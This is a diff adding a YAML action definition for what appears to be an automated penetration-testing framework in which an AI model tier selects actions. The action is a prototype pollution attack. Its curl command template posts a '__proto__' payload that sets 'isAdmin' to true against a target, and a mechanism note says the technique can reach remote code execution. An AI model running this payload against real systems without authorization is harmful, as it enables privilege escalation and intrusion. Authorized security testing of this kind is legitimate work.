@@ -1,0 +1,16 @@
+name: prototype_pollution
+category: web
+description: JavaScript prototype pollution
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "curl -s '{target_url}' -H 'Content-Type: application/json' -d '{{"__proto__":{{"isAdmin":true}}}}'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Pollute Object.prototype to inject properties. Targets: Node.js merge/clone functions, JSON parsing. Can lead to RCE via child_process options pollution."
